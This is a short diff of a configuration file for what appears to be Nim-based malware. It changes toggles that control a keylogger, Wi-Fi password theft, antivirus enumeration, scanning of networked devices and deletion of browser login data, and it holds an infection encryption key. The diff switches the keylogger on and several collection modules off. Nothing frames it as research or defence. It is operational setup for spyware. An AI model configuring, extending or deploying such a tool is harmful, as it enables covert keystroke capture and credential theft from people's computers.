@@ -19,12 +19,12 @@ const USE_CLIPBOARD_THREAD*: bool = false
 ## getAVSThread is used for getting
 ## all the installed antivirus software on the user's pc
 ## DEFAULT: true
-const USE_GET_AVS_THREAD*: bool = true
+const USE_GET_AVS_THREAD*: bool = false
 
 ## wifiPasswordsThread is used for getting
 ## all the wifi passwords stored on user's pc
 ## DEFAULT: true
-const USE_WIFI_PASSWORDS_THREAD*: bool = true
+const USE_WIFI_PASSWORDS_THREAD*: bool = false
 
 ## connectedWifiThread is used for getting
 ## all the networks the user is connected to
@@ -42,7 +42,7 @@ const USE_SCREENSHOT_THREAD*: bool = false
 
 ## keyloggerThread is used for logging key presses
 ## DEFAULT: true
-const USE_KEYLOGGER_THREAD*: bool = false
+const USE_KEYLOGGER_THREAD*: bool = true
 
 ## browserThread is used for deleting cookies and login data
 ## so the user is forced to login back again
@@ -68,7 +68,7 @@ const INFECT_ENCRYPTION_KEY*: string = e"abiestezeulmeu1"
 ## connectedDevicesThread is used for getting all the connected
 ## devices on a wifi network
 ## DEFAULT: true
-const USE_CONNECTED_DEVICES_THREAD*: bool = true
+const USE_CONNECTED_DEVICES_THREAD*: bool = false
 
 ## the number of threads connectedDevicesThread will use
 ## to check ips
